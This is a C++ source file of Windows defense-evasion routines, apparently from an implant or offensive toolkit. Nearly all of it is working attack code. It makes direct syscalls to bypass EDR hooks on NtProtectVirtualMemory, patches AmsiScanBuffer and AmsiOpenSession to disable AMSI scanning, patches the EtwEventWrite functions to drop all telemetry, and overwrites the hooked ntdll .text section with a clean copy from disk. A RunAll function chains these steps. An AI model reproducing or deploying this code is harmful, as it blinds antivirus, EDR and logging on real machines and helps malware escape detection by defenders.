#include "Evasion.h"
#include "DirectSyscall.h"

// Call NtProtectVirtualMemory via direct syscall — bypasses EDR hooks on VirtualProtect.
// DirectSyscall::Init() must have run before any of these functions are called.
static bool SyscallProtect(void* addr, SIZE_T len, DWORD prot, DWORD* oldProt) {
    int ssn = DirectSyscall::GetSSN(NT_PROTECT_VIRTUAL_MEM);
    if (ssn < 0) return VirtualProtect(addr, len, prot, oldProt) != 0;
    // NtProtectVirtualMemory requires page-aligned base address
    PVOID  base = (PVOID)((ULONG_PTR)addr & ~(ULONG_PTR)0xFFF);
    SIZE_T sz   = ((ULONG_PTR)addr + len + 0xFFF - (ULONG_PTR)base) & ~(SIZE_T)0xFFF;
    ULONG  old  = 0;
    NTSTATUS st = DirectSyscall::Exec(ssn,
        (ULONG_PTR)GetCurrentProcess(),
        (ULONG_PTR)&base, (ULONG_PTR)&sz,
        (ULONG_PTR)prot,  (ULONG_PTR)&old);
    if (oldProt) *oldProt = (DWORD)old;
    return st >= 0;
}

// Write `patch` bytes at `addr` using NtProtectVirtualMemory via direct syscall.
// EDR hooks on NtProtectVirtualMemory are bypassed — the protection change
// is invisible to user-mode EDR inspection before UnhookNtdll has run.
static bool PatchMem(void* addr, const BYTE* patch, size_t len) {
    DWORD old = 0;
    if (!SyscallProtect(addr, len, PAGE_EXECUTE_READWRITE, &old)) return false;
    memcpy(addr, patch, len);
    SyscallProtect(addr, len, old, &old);
    FlushInstructionCache(GetCurrentProcess(), addr, len);
    return true;
}

// ── AMSI bypass ───────────────────────────────────────────────────────────────
// Patch AmsiScanBuffer  → always return E_INVALIDARG (0x80070057).
// Patch AmsiOpenSession → always return S_OK (0) without initializing a session.
bool Evasion::PatchAmsi() {
    HMODULE h = LoadLibraryA(S("amsi.dll").c_str());
    if (!h) return false;

    FARPROC fn = GetProcAddress(h, S("AmsiScanBuffer").c_str());
    if (!fn) return false;
    // x64: mov eax, E_INVALIDARG; ret
    const BYTE p[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    bool ok = PatchMem((void*)fn, p, sizeof(p));

    // AmsiOpenSession: return S_OK without creating a real session context.
    // Some implementations skip AmsiScanBuffer if OpenSession already failed.
    FARPROC fn2 = GetProcAddress(h, S("AmsiOpenSession").c_str());
    if (fn2) {
        const BYTE p2[] = { 0x33, 0xC0, 0xC3 };  // xor eax,eax; ret → S_OK
        PatchMem((void*)fn2, p2, sizeof(p2));
    }
    return ok;
}

// ── ETW blind ─────────────────────────────────────────────────────────────────
// Patch three ETW write entry points with `ret` to drop all telemetry events.
// EtwEventWrite is the primary path; EtwEventWriteFull and EtwEventWriteEx
// are alternate paths used by some event providers and by the kernel bridge.
bool Evasion::PatchEtw() {
    HMODULE h = GetModuleHandleA(S("ntdll.dll").c_str());
    if (!h) return false;
    const BYTE p[] = { 0xC3 };  // ret
    bool ok = false;

    FARPROC fn = GetProcAddress(h, S("EtwEventWrite").c_str());
    if (fn) ok |= PatchMem((void*)fn, p, sizeof(p));

    FARPROC fn2 = GetProcAddress(h, S("EtwEventWriteFull").c_str());
    if (fn2) PatchMem((void*)fn2, p, sizeof(p));

    FARPROC fn3 = GetProcAddress(h, S("EtwEventWriteEx").c_str());
    if (fn3) PatchMem((void*)fn3, p, sizeof(p));

    return ok;
}

// ── ntdll unhook ──────────────────────────────────────────────────────────────
// Map a clean copy of ntdll from disk (SEC_IMAGE) and overwrite the live .text
// section, removing all JMP hooks EDRs inject at ntdll export stubs.
// VirtualProtect for the live section is done via direct syscall so the EDR
// hook on NtProtectVirtualMemory itself is bypassed during the unhook.
bool Evasion::UnhookNtdll() {
    char sysDir[MAX_PATH] = {};
    GetSystemDirectoryA(sysDir, MAX_PATH);
    std::string path = std::string(sysDir) + S("\\ntdll.dll");

    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return false;

    LPVOID pFresh = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!pFresh) return false;

    HMODULE hNtdll = GetModuleHandleA(S("ntdll.dll").c_str());

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pFresh;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)pFresh + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    bool ok = false;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;
        void* dst = (BYTE*)hNtdll + sec->VirtualAddress;
        void* src = (BYTE*)pFresh  + sec->VirtualAddress;
        DWORD old = 0;
        if (!SyscallProtect(dst, sec->Misc.VirtualSize, PAGE_EXECUTE_WRITECOPY, &old)) break;
        memcpy(dst, src, sec->Misc.VirtualSize);
        SyscallProtect(dst, sec->Misc.VirtualSize, old, &old);
        FlushInstructionCache(GetCurrentProcess(), dst, sec->Misc.VirtualSize);
        ok = true;
        break;
    }

    UnmapViewOfFile(pFresh);
    return ok;
}

// RunAll: unhook ntdll first so AMSI and ETW patches run on a clean Nt* call path.
// All three steps use SyscallProtect internally, so EDR hooks are bypassed
// regardless of ordering — but UnhookNtdll first is cleaner in principle.
std::string Evasion::RunAll() {
    std::string r;
    r += "ntdll unhook: " + std::string(UnhookNtdll()  ? "ok" : "failed") + "\n";
    r += "AMSI patch:   " + std::string(PatchAmsi()    ? "ok" : "failed") + "\n";
    r += "ETW blind:    " + std::string(PatchEtw()     ? "ok" : "failed") + "\n";
    return r;
}
